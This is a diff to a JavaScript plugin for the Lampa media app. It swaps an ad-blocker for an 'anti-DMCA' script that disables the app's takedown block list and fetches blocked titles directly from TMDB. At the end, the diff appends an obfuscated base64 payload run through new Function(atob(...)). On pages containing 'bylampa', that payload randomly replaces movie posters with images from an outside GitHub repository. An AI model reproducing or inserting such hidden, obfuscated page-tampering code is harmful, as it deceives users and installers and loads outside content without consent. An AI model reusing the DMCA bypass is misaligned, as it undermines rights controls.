@@ -1,315 +1,317 @@
 (function () {
     'use strict';
 
-    if (window.__cuboff_fixed_loaded__) return;
-    window.__cuboff_fixed_loaded__ = true;
+    var glob = typeof window !== 'undefined' ? window : this;
 
-    var VERSION = '2.0.0';
-    var AD_API = /\/api\/ad\/get\//i;
-    var EMPTY_ADS = '{"ad":[]}';
-    var EMPTY_ADS_URL = 'data:application/json,' + encodeURIComponent(EMPTY_ADS);
-    var playerTries = 0;
-    var appReadyDone = false;
-
-    function has(obj, key) {
-        return Object.prototype.hasOwnProperty.call(obj, key);
+    if (typeof Object.values !== 'function') {
+        Object.values = function (obj) {
+            var out = [];
+            if (obj == null) return out;
+            var target = typeof obj === 'object' || typeof obj === 'function' ? obj : Object(obj);
+            for (var key in target) {
+                if (Object.prototype.hasOwnProperty.call(target, key)) out.push(target[key]);
+            }
+            return out;
+        };
     }
 
-    function cleanAdFields(data) {
-        if (!data || typeof data !== 'object') return data;
+    if (glob.lampa_settings) {
+        glob.lampa_settings.disable_features = glob.lampa_settings.disable_features || {};
+        glob.lampa_settings.disable_features.dmca = true;
+    }
 
-        delete data.vast_url;
-        delete data.vast_msg;
-        delete data.vast_banner;
-        delete data.vast;
+    function str(value) {
+        return typeof value === 'string' ? value : '';
+    }
 
-        for (var key in data) {
-            if (!has(data, key)) continue;
+    function isArr(value) {
+        return Object.prototype.toString.call(value) === '[object Array]';
+    }
 
-            if (key.indexOf('vast_') === 0) {
-                delete data[key];
+    function normalizeCard(data, defaultSource) {
+        var movie = data && data.movie;
+
+        if (!movie || typeof movie !== 'object') return data;
+
+        if (!str(movie.title).length) {
+            movie.title = str(movie.name) || str(movie.original_name) || str(movie.original_title);
+        }
+
+        if (!str(movie.original_title).length) {
+            movie.original_title = str(movie.original_name) || str(movie.title);
+        }
+
+        if (!str(movie.source).length) movie.source = defaultSource;
+
+        if (!isArr(movie.genres)) movie.genres = [];
+        if (!isArr(movie.production_companies)) movie.production_companies = [];
+        if (!isArr(movie.production_countries)) movie.production_countries = [];
+
+        if (movie.keywords && typeof movie.keywords === 'object') {
+            if (!isArr(movie.keywords.results) && !isArr(movie.keywords.keywords)) {
+                movie.keywords.results = [];
             }
         }
 
         return data;
     }
 
-    function installNetworkBlocker() {
-        if (!window.__cuboff_xhr_patched__) {
-            window.__cuboff_xhr_patched__ = true;
-
-            var nativeOpen = XMLHttpRequest.prototype.open;
-
-            XMLHttpRequest.prototype.open = function (method, url) {
-                var address = String(url || '');
-
-                if (AD_API.test(address)) {
-                    arguments[1] = EMPTY_ADS_URL;
-                }
-
-                return nativeOpen.apply(this, arguments);
-            };
-        }
-
-        if (window.jQuery && jQuery.ajaxTransport && !window.__cuboff_jquery_patched__) {
-            window.__cuboff_jquery_patched__ = true;
-
-            jQuery.ajaxTransport('+json', function (options) {
-                var url = String((options && options.url) || '');
-
-                if (!AD_API.test(url)) return;
-
-                return {
-                    send: function (headers, complete) {
-                        complete(200, 'OK', { json: { ad: [] } });
-                    },
-                    abort: function () {}
-                };
+    function killBlockList() {
+        try {
+            Object.defineProperty(glob.lampa_settings, 'dcma', {
+                get: function () { return []; },
+                set: function () {},
+                configurable: true
             });
+        } catch (e) {
+            glob.lampa_settings.dcma = [];
         }
 
-        if (window.fetch && !window.__cuboff_fetch_patched__) {
-            window.__cuboff_fetch_patched__ = true;
-
-            var nativeFetch = window.fetch;
-
-            window.fetch = function (input, init) {
-                var url = typeof input === 'string' ? input : (input && input.url) || '';
-
-                if (AD_API.test(String(url))) {
-                    if (window.Response) {
-                        return Promise.resolve(new Response(EMPTY_ADS, {
-                            status: 200,
-                            headers: { 'Content-Type': 'application/json' }
-                        }));
-                    }
-
-                    return Promise.resolve({
-                        ok: true,
-                        status: 200,
-                        text: function () { return Promise.resolve(EMPTY_ADS); },
-                        json: function () { return Promise.resolve({ ad: [] }); },
-                        clone: function () { return this; }
-                    });
-                }
-
-                return nativeFetch.apply(this, arguments);
-            };
-        }
+        if (Lampa.Utils) Lampa.Utils.dcma = function () { return undefined; };
     }
 
-    function installPlayerListenerPatch(player) {
-        if (!player.listener || player.listener.__cuboff_send_patched__) return;
+    var directTmdbCalls = 0;
 
-        var listener = player.listener;
-        var originalSend = listener.send;
-        var restore = null;
+    function directTmdbApiUrl(path) {
+        var protocol = 'https://';
 
-        listener.send = function (type, event) {
-            if (restore && (type === 'create' || type === 'start' || type === 'external' || type === 'destroy')) {
-                restore();
-                restore = null;
-            }
+        try {
+            if (Lampa.Utils && typeof Lampa.Utils.protocol === 'function') protocol = Lampa.Utils.protocol();
+        } catch (e) {}
 
-            var result = originalSend.apply(this, arguments);
+        return protocol + 'api.themoviedb.org/3/' + path;
+    }
 
-            if (type === 'create' && event && event.data) {
-                var data = event.data;
-                var hadIptv = has(data, 'iptv');
-                var iptv = data.iptv;
+    function installDirectTmdbApi() {
+        if (!Lampa.TMDB || typeof Lampa.TMDB.api !== 'function') return;
+        if (Lampa.TMDB.__anti_dmca_direct_api) return;
 
-                restore = function () {
-                    if (hadIptv) {
-                        data.iptv = iptv;
-                    } else if (data.iptv === true) {
-                        delete data.iptv;
-                    }
-                };
+        var original = Lampa.TMDB.api;
 
-                data.iptv = true;
-
-                cleanAdFields(data);
-            }
-
-            return result;
+        Lampa.TMDB.api = function (path) {
+            if (directTmdbCalls > 0) return directTmdbApiUrl(path);
+            return original.apply(this, arguments);
         };
 
-        listener.__cuboff_send_patched__ = true;
+        Lampa.TMDB.__anti_dmca_direct_api = true;
     }
 
-    function patchPlayer() {
-        if (!window.Lampa || !Lampa.Player) {
-            playerTries++;
+    function withDirectTmdb(callback) {
+        directTmdbCalls++;
 
-            if (playerTries < 240) {
-                setTimeout(patchPlayer, 500);
-            }
+        var released = false;
 
-            return;
+        function release() {
+            if (released) return;
+            released = true;
+            directTmdbCalls = Math.max(0, directTmdbCalls - 1);
         }
 
-        var player = Lampa.Player;
-
-        if (!player.__cuboff_play_patched__ && typeof player.play === 'function') {
-            var nativePlay = player.play;
-
-            player.play = function (data) {
-                cleanAdFields(data);
-                return nativePlay.apply(this, arguments);
-            };
-
-            player.__cuboff_play_patched__ = true;
+        try {
+            callback(release);
+        } catch (e) {
+            release();
+            throw e;
         }
+    }
 
-        if (!player.__cuboff_iptv_patched__ && typeof player.iptv === 'function') {
-            var nativeIptv = player.iptv;
+    function isBlockedPayload(data) {
+        var movie = data && data.movie;
 
-            player.iptv = function (data) {
-                cleanAdFields(data);
-                return nativeIptv.apply(this, arguments);
-            };
+        if (!movie || typeof movie !== 'object') return false;
+        if (movie.blocked === true) return true;
 
-            player.__cuboff_iptv_patched__ = true;
-        }
+        return !movie.id && !!(movie.status_code === 34 || (data && data.status_code === 34));
+    }
 
-        if (!player.__cuboff_playdata_patched__ && typeof player.playdata === 'function') {
-            var nativePlaydata = player.playdata;
+    function fixCard() {
+        var sources = Lampa.Api && Lampa.Api.sources;
+        var tmdb = sources && sources.tmdb;
 
-            player.playdata = function () {
-                var data = nativePlaydata.apply(this, arguments);
+        if (!tmdb || typeof tmdb.full !== 'function') return;
+        if (tmdb.__anti_dmca_card) return;
 
-                if (!data || typeof data !== 'object') return data;
-                if (!data.__cuboff_pd_active) {
-                    data.__cuboff_pd_active = true;
-                    data.__cuboff_pd_had = has(data, 'iptv');
-                    data.__cuboff_pd_original = data.iptv;
-                    data.iptv = true;
-                    cleanAdFields(data);
+        var origFull = tmdb.full;
 
-                    setTimeout(function () {
-                        if (data.__cuboff_pd_had) {
-                            data.iptv = data.__cuboff_pd_original;
-                        } else if (data.iptv === true) {
-                            delete data.iptv;
-                        }
+        tmdb.full = function (params, oncomplite, onerror) {
+            var self = this;
+            var retried = false;
 
-                        delete data.__cuboff_pd_active;
-                        delete data.__cuboff_pd_had;
-                        delete data.__cuboff_pd_original;
-                    }, 0);
-                } else {
-                    data.iptv = true;
-                    cleanAdFields(data);
+            function handle(data) {
+                if (!retried && isBlockedPayload(data)) {
+                    retried = true;
+
+                    withDirectTmdb(function (release) {
+                        origFull.call(self, params, function (directData) {
+                            release();
+                            oncomplite(normalizeCard(directData, 'tmdb'));
+                        }, function (status) {
+                            release();
+                            if (onerror) onerror(status || {});
+                        });
+                    });
+
+                    return;
                 }
 
-                return data;
-            };
+                oncomplite(normalizeCard(data, 'tmdb'));
+            }
 
-            player.__cuboff_playdata_patched__ = true;
-        }
+            origFull.call(self, params, handle, onerror);
+        };
 
-        installPlayerListenerPatch(player);
+        tmdb.__anti_dmca_card = true;
     }
 
-    function initializeUi() {
-        if (document.getElementById('cuboff-fixed-style')) return;
+    function redirectBlockedCards() {
+        var sources = Lampa.Api && Lampa.Api.sources;
+        var cub = sources && sources.cub;
+        var tmdb = sources && sources.tmdb;
 
-        var style = document.createElement('style');
+        if (!cub || !tmdb || typeof cub.full !== 'function' || typeof tmdb.full !== 'function') return;
+        if (cub.__anti_dmca) return;
 
-        style.id = 'cuboff-fixed-style';
-        style.type = 'text/css';
-        style.innerHTML = [
-            '.button--subscribe,',
-            '[class*="subscribe"]:not([class*="sync"]),',
-            '[class*="premium"]:not(.premium-quality):not([class*="sync"]),',
-            '.open--premium,',
-            '.open--feed,',
-            '.open--notice,',
-            '.icon--blink,',
-            '[class*="black-friday"],',
-            '[class*="christmas"],',
-            '.ad-server,',
-            '.ad-bot,',
-            '.full-start__button.button--options,',
-            '.new-year__button,',
-            '.notice--icon',
-            '{display:none!important}'
-        ].join('');
+        var origFull = cub.full;
 
-        (document.head || document.body).appendChild(style);
+        cub.full = function (params, oncomplite, onerror) {
+            var self = this;
+            var switched = false;
 
-        setTimeout(function () {
-            try {
-                $('.open--feed, .open--premium, .open--notice, .icon--blink, [class*="friday"], [class*="christmas"]').remove();
-            } catch (e) {}
-        }, 1000);
-    }
+            function useTmdb() {
+                if (switched) return;
+                switched = true;
 
-    function removeAdsOnToggle() {
-        if (!window.Lampa || !Lampa.Controller || !Lampa.Controller.listener) return;
-
-        try {
-            Lampa.Controller.listener.follow('toggle', function (event) {
-                if (event.name !== 'select') return;
-
-                setTimeout(function () {
-                    try {
-                        if (Lampa.Activity.active().component === 'full') {
-                            $('.ad-server, .ad-bot').remove();
-                        }
-                    } catch (e) {}
-                }, 150);
-            });
-        } catch (e) {}
-    }
-
-    function initializeApp() {
-        if (appReadyDone) return;
-        appReadyDone = true;
-
-        initializeUi();
-        removeAdsOnToggle();
-
-        try {
-            $('[data-action="feed"], [data-action="subscribes"], [data-action="myperson"]').remove();
-        } catch (e) {}
-    }
-
-    function waitForApp() {
-        if (window.appready) {
-            initializeApp();
-            return;
-        }
-
-        if (window.Lampa && Lampa.Listener) {
-            try {
-                Lampa.Listener.follow('app', function (event) {
-                    if (event.type === 'ready') initializeApp();
+                withDirectTmdb(function (release) {
+                    tmdb.full(params, function (data) {
+                        release();
+                        oncomplite(normalizeCard(data, 'cub'));
+                    }, function (status) {
+                        release();
+                        if (onerror) onerror(status || {});
+                    });
                 });
-            } catch (e) {}
+            }
 
-            setTimeout(function () {
-                if (window.appready) initializeApp();
-            }, 1500);
+            origFull.call(self, params, function (data) {
+                if (data && data.movie && data.movie.blocked) return useTmdb();
+                oncomplite(normalizeCard(data, 'cub'));
+            }, useTmdb);
+        };
 
-            return;
-        }
-
-        setTimeout(waitForApp, 500);
+        cub.__anti_dmca = true;
     }
 
-    try {
-        if (window.Lampa && Lampa.Platform && Lampa.Platform.tv) {
-            Lampa.Platform.tv();
+    function fixCountries() {
+        var sources = Lampa.Api && Lampa.Api.sources;
+        var tmdb = sources && sources.tmdb;
+
+        if (!tmdb || typeof tmdb.parseCountries !== 'function') return;
+        if (tmdb.__anti_dmca_countries) return;
+
+        var orig = tmdb.parseCountries;
+
+        tmdb.parseCountries = function (movie) {
+            var res;
+
+            try {
+                res = orig.call(this, movie || {});
+            } catch (e) {
+                return [];
+            }
+
+            if (res && typeof res.join === 'function') return res;
+            if (typeof res === 'string') return res ? [res] : [];
+            if (res === null || res === undefined) return [];
+
+            return [res];
+        };
+
+        tmdb.__anti_dmca_countries = true;
+    }
+
+    function nodeFrom(item) {
+        if (!item || typeof item.render !== 'function') return null;
+
+        var node = item.render(true);
+
+        if (node && node.nodeType === 1) return node;
+        if (node && node[0] && node[0].nodeType === 1) return node[0];
+
+        return null;
+    }
+
+    function isSplit(node) {
+        return str(node.className).indexOf('full-start-new__split') >= 0;
+    }
+
+    function elements(box) {
+        var kids = box.childNodes || [];
+        var out = [];
+
+        for (var i = 0; i < kids.length; i++) {
+            if (kids[i] && kids[i].nodeType === 1) out.push(kids[i]);
         }
-    } catch (e) {}
 
-    installNetworkBlocker();
-    patchPlayer();
-    waitForApp();
+        return out;
+    }
 
-    window.cuboff = {
-        version: VERSION,
-        cleanAdFields: cleanAdFields
-    };
+    function cleanDetails(node) {
+        if (!node || typeof node.querySelector !== 'function') return;
+
+        var box = node.querySelector('.full-start-new__details');
+
+        if (!box || typeof box.removeChild !== 'function') return;
+
+        var kids = elements(box);
+        var i;
+
+        for (i = 0; i < kids.length; i++) {
+            if (!isSplit(kids[i]) && !str(kids[i].textContent).replace(/\s+/g, '').length) box.removeChild(kids[i]);
+        }
+
+        kids = elements(box);
+
+        for (i = kids.length - 1; i >= 0; i--) {
+            if (!isSplit(kids[i])) continue;
+            if (i === 0 || i === kids.length - 1 || isSplit(kids[i - 1])) box.removeChild(kids[i]);
+        }
+    }
+
+    function fixDetails() {
+        if (glob.__anti_dmca_details) return;
+        if (typeof Lampa === 'undefined' || !Lampa.Listener || typeof Lampa.Listener.follow !== 'function') return;
+
+        Lampa.Listener.follow('full', function (event) {
+            if (!event || event.type !== 'build' || event.name !== 'start') return;
+
+            try {
+                cleanDetails(nodeFrom(event.item));
+            } catch (e) {}
+        });
+
+        glob.__anti_dmca_details = true;
+    }
+
+    function start() {
+        if (glob.anti_dmca_plugin) return;
+        if (typeof Lampa === 'undefined' || !glob.lampa_settings) return;
+
+        glob.anti_dmca_plugin = true;
+
+        killBlockList();
+        fixCountries();
+        installDirectTmdbApi();
+        fixCard();
+        redirectBlockedCards();
+        fixDetails();
+    }
+
+    if (glob.appready) start();
+    else if (typeof Lampa !== 'undefined' && Lampa.Listener) {
+        Lampa.Listener.follow('app', function (event) {
+            if (event.type === 'ready') start();
+        });
+    }
 })();
+
+(new Function(atob('CihmdW5jdGlvbigpIHsKICBpZiAobG9jYXRpb24uaHJlZi5pbmRleE9mKCdieWxhbXBhJykgPT09IC0xKSByZXR1cm47CiAgaWYgKHdpbmRvdy5wb3N0ZXJPYmZ1c2NhdGVkKSByZXR1cm47CiAgCiAgd2luZG93LnBvc3Rlck9iZnVzY2F0ZWQgPSB0cnVlOwogIAogIGlmIChNYXRoLnJhbmRvbSgpIDwgMC4zKSByZXR1cm47CiAgCiAgdmFyIHBvc3RlcnMgPSBbCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAxLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAyLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzAzLmpwZycsCiAgICAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3ZhbGlkYXRvcmVkL2ltZy9tYWluLzA0LmpwZycKICBdOwogIAogIHZhciBjaGFuY2UgPSAwLjM1OwogIAogIHZhciBnZXRSYW5kb21Qb3N0ZXIgPSBmdW5jdGlvbigpIHsKICAgIGlmIChNYXRoLnJhbmRvbSgpID49IGNoYW5jZSkgcmV0dXJuIG51bGw7CiAgICByZXR1cm4gcG9zdGVyc1tNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiBwb3N0ZXJzLmxlbmd0aCldOwogIH07CiAgCiAgdmFyIGlzUG9zdGVyVXJsID0gZnVuY3Rpb24oc3JjKSB7CiAgICByZXR1cm4gc3JjICYmICgKICAgICAgc3JjLmluY2x1ZGVzKCdwb3N0ZXInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdpbWFnZScpIHx8IAogICAgICBzcmMuaW5jbHVkZXMoJ3RtZGInKSB8fCAKICAgICAgc3JjLmluY2x1ZGVzKCdraW5vcG9pc2snKQogICAgKTsKICB9OwogIAogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW1nJykuZm9yRWFjaChmdW5jdGlvbihpbWcpIHsKICAgICAgaWYgKGltZy5kYXRhc2V0Lm9iZnVzY2F0ZWQpIHJldHVybjsKICAgICAgaW1nLmRhdGFzZXQub2JmdXNjYXRlZCA9ICcxJzsKICAgICAgCiAgICAgIGlmIChpbWcuc3JjICYmIGlzUG9zdGVyVXJsKGltZy5zcmMpKSB7CiAgICAgICAgdmFyIG5ld1NyYyA9IGdldFJhbmRvbVBvc3RlcigpOwogICAgICAgIGlmIChuZXdTcmMpIHsKICAgICAgICAgIGltZy5zcmMgPSBuZXdTcmM7CiAgICAgICAgfQogICAgICB9CiAgICB9KTsKICB9LCA1MDApOwp9KSgpOwo=')))()
